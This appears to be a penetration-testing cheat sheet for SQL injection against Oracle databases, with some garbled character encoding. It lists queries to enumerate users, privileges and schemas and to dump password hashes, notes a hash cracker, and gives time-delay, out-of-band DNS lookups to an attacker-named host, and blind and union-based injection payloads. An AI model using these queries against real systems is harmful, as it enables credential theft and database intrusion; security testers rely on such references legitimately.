Some of the queries in the table below can only be run by an admin.  These are marked with â€œâ€“ privâ€ at the end of the query.

Version	
SELECT banner FROM v$version WHERE banner LIKE â€˜Oracle%â€™;
SELECT banner FROM v$version WHERE banner LIKE â€˜TNS%â€™;
SELECT version FROM v$instance;

Comments	
SELECT 1 FROM dual â€” comment
â€” NB: SELECT statements must have a FROM clause in Oracle so we have to use the dummy table name â€˜dualâ€™ when weâ€™re not actually selecting from a table.

Current User	
SELECT user FROM dual

List Users	
SELECT username FROM all_users ORDER BY username;
SELECT name FROM sys.user$; â€” priv

List Password Hashes	
SELECT name, password, astatus FROM sys.user$ â€” priv, <= 10g.  astatus tells you if acct is locked
SELECT name,spare4 FROM sys.user$ â€” priv, 11g
Password Cracker	
checkpwd will crack the DES-based hashes from Oracle 8, 9 and 10.

List Privileges	
SELECT * FROM session_privs; â€” current privs
SELECT * FROM dba_sys_privs WHERE grantee = â€˜DBSNMPâ€™; â€” priv, list a userâ€™s privs
SELECT grantee FROM dba_sys_privs WHERE privilege = â€˜SELECT ANY DICTIONARYâ€™; â€” priv, find users with a particular priv
SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS;

List DBA Accounts	
SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = â€˜YESâ€™; â€” priv, list DBAs, DBA roles

Current Database	
SELECT global_name FROM global_name;
SELECT name FROM v$database;
SELECT instance_name FROM v$instance;
SELECT SYS.DATABASE_NAME FROM DUAL;

List Databases	
SELECT DISTINCT owner FROM all_tables; â€” list schemas (one per user)
â€” Also query TNS listener for other databases.  See tnscmd (services | status).

List Columns	
SELECT column_name FROM all_tab_columns WHERE table_name = â€˜blahâ€™;
SELECT column_name FROM all_tab_columns WHERE table_name = â€˜blahâ€™ and owner = â€˜fooâ€™;

List Tables	
SELECT table_name FROM all_tables;
SELECT owner, table_name FROM all_tables;

Find Tables From Column Name	
SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE â€˜%PASS%â€™; â€” NB: table names are upper case

Select Nth Row	
SELECT username FROM (SELECT ROWNUM r, username FROM all_users ORDER BY username) WHERE r=9; â€” gets 9th row (rows numbered from 1)

Select Nth Char	
SELECT substr(â€˜abcdâ€™, 3, 1) FROM dual; â€” gets 3rd character, â€˜câ€™

Bitwise AND	
SELECT bitand(6,2) FROM dual; â€” returns 2
SELECT bitand(6,1) FROM dual; â€” returns0

ASCII Value -> Char	
SELECT chr(65) FROM dual; â€” returns A

Char -> ASCII Value	
SELECT ascii(â€˜Aâ€™) FROM dual; â€” returns 65

Casting	
SELECT CAST(1 AS char) FROM dual;
SELECT CAST(â€˜1â€™ AS int) FROM dual;

String Concatenation	
SELECT â€˜Aâ€™ || â€˜Bâ€™ FROM dual; â€” returns AB

If Statement	
BEGIN IF 1=1 THEN dbms_lock.sleep(3); ELSE dbms_lock.sleep(0); END IF; END; â€” doesnâ€™t play well with SELECT statements

Case Statement	
SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END FROM dual; â€” returns 1
SELECT CASE WHEN 1=2 THEN 1 ELSE 2 END FROM dual; â€” returns 2

Avoiding Quotes	
SELECT chr(65) || chr(66) FROM dual; â€” returns AB

Time Delay	
BEGIN DBMS_LOCK.SLEEP(5); END; â€” priv, canâ€™t seem to embed this in a SELECT
SELECT UTL_INADDR.get_host_name(â€˜10.0.0.1â€™) FROM dual; â€” if reverse looks are slow
SELECT UTL_INADDR.get_host_address(â€˜blah.attacker.comâ€™) FROM dual; â€” if forward lookups are slow
SELECT UTL_HTTP.REQUEST(â€˜http://google.comâ€™) FROM dual; â€” if outbound TCP is filtered / slow
â€” Also see Heavy Queries to create a time delay

Make DNS Requests	
SELECT UTL_INADDR.get_host_address(â€˜google.comâ€™) FROM dual;
SELECT UTL_HTTP.REQUEST(â€˜http://google.comâ€™) FROM dual;

Command Execution	
Java can be used to execute commands if itâ€™s installed.ExtProc can sometimes be used too, though it normally failed for me. ğŸ™
Local File Access	
UTL_FILE can sometimes be used.  Check that the following is non-null:
SELECT value FROM v$parameter2 WHERE name = â€˜utl_file_dirâ€™;Java can be used to read and write files if itâ€™s installed (it is not available in Oracle Express).

Hostname, IP Address	
SELECT UTL_INADDR.get_host_name FROM dual;
SELECT host_name FROM v$instance;
SELECT UTL_INADDR.get_host_address FROM dual; â€” gets IP address
SELECT UTL_INADDR.get_host_name(â€˜10.0.0.1â€™) FROM dual; â€” gets hostnames

Location of DB files	
SELECT name FROM V$DATAFILE;

Default/System Databases	
SYSTEM
SYSAUX
Get all tablenames in one string	
select rtrim(xmlagg(xmlelement(e, table_name || â€˜,â€™)).extract(â€˜//text()â€™).extract(â€˜//text()â€™) ,â€™,â€™) from all_tables â€”  when using union based SQLI with only one row

Blind SQLI in order by clause	
order by case when ((select 1 from user_tables where substr(lower(table_name), 1, 1) = â€˜aâ€™ and rownum = 1)=1) then column_name1 else column_name2 end â€” you must know 2 column names with the same datatype
